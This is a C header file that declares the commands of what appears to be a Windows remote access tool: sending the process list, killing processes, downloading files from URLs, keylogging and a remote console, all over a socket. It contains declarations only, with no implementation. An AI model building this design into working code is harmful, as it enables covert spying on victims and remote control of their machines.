#ifndef CMD_H
#define CMD_H

#include <winsock2.h>
#include <TlHelp32.h>
#include <Shlobj.h>
#include <UrlMon.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

#include "sock.h"

void WINAPI SendProcessList(SOCKET sock);
void WINAPI KillProcess(SOCKET sock, char *process);
void WINAPI DownloadFile(SOCKET sock, char *url);
void WINAPI KeyLogger(SOCKET sock);
void WINAPI GetConsole(SOCKET sock);

#endif